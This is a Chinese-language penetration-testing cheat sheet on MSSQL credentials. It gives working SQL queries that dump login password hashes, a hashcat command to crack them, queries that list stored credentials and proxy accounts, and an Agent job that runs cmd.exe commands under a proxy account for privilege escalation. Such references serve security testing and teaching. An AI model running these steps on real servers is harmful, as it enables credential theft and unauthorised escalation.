# MSSQL - 凭据 (Credentials)

## 目录 (Summary)

* [MSSQL 账号与哈希 (MSSQL Accounts and Hashes)](#mssql-accounts-and-hashes)
* [列出 SQL Server 上的凭据 (List Credentials on the SQL Server)](#list-credentials-on-the-sql-server)
* [代理账号上下文 (Proxy Account Context)](#proxy-account-context)

## MSSQL 账号与哈希 (MSSQL Accounts and Hashes)

* MSSQL 2000

    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    --（需要转换为十六进制，以便在 MSSQL 错误消息或某些版本的查询分析器中返回哈希值。）
    ```

* MSSQL 2005

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

随后使用 Hashcat 破解密码：`hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force`

| 哈希模式 | 哈希名称 | 示例 |
| ---  | --- | --- |
| 131  | MSSQL (2000) | 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 |
| 132  | MSSQL (2005) | 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe |
| 1731 | MSSQL (2012, 2014) | 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375 |

## 列出 SQL Server 上的凭据 (List Credentials on the SQL Server)

* 列出在 SQL Server 实例上配置的凭据

    ```sql
    SELECT * FROM sys.credentials 
    ```

* 列出代理账号 (Proxy Accounts)

    ```sql
    USE msdb; 
    GO 

    SELECT  
        proxy_id, 
        name AS proxy_name, 
        credential_id, 
        enabled 
    FROM  
        dbo.sysproxies; 
    GO 
    ```

* [dataplat/dbatools/Get-DecryptedObject.ps1](https://github.com/dataplat/dbatools/blob/7ad0415c2f8a58d3472c1e85ee431c70f1bb8ae4/private/functions/Get-DecryptedObject.ps1)

## 代理账号上下文 (Proxy Account Context)

使用注册的代理凭据运行代理作业 (Agent Job)。

```sql
USE msdb; 
GO 

-- 创建作业 
EXEC sp_add_job  
  @job_name = N'WhoAmIJob'; -- 作业名称 

-- 添加一个作业步骤，使用代理执行 whoami 命令 
EXEC sp_add_jobstep  
  @job_name = N'WhoAmIJob',  
  @step_name = N'ExecuteWhoAmI',  
  @subsystem = N'CmdExec',          
  @command = N'c:\windows\system32\cmd.exe /c whoami > c:\windows\temp\whoami.txt',           
  @on_success_action = 1,         -- 1 = 成功后退出 
  @on_fail_action = 2,                     -- 2 = 失败后退出 
  @proxy_name = N'MyCredentialProxy';     -- 此前创建的代理 

-- 向作业添加计划（可选，可以是手动触发或定期调度） 
EXEC sp_add_jobschedule  
  @job_name = N'WhoAmIJob',  
  @name = N'RunOnce',  
  @freq_type = 1,             -- 1 = 一次性 
  @active_start_date = 20240820,       
  @active_start_time = 120000;            

-- 将作业添加到 SQL Server 代理 
EXEC sp_add_jobserver  
  @job_name = N'WhoAmIJob',  
  @server_name = N'(LOCAL)';  
```

执行代理作业，以便一个进程将在代理账号的上下文中启动并执行你的代码/命令。
`EXEC sp_start_job @job_name = N'WhoAmIJob';`

## 参考资料 (References)

* [Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation  - Scott Sutherland - September 10, 2024](https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)
